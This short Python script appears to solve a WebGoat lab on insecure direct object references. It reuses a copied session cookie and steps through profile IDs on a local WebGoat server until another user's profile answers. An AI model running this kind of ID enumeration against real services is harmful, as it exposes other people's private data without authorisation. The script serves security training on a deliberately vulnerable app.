import requests 
	def idor():
        index = 2342384 # start's with tom's profile
        headers={
                'Cookie':'COOKIE' #cookie copied from request of lesson 3
        }
        while True:
                r=requests.get('http://localhost:8080/WebGoat/IDOR/profile/{}'.format(index),headers=headers)
                if r.status_code != 500 and index != 2342384:
                        print("index:{}".format(index))
                        return
                index+=1

	idor()

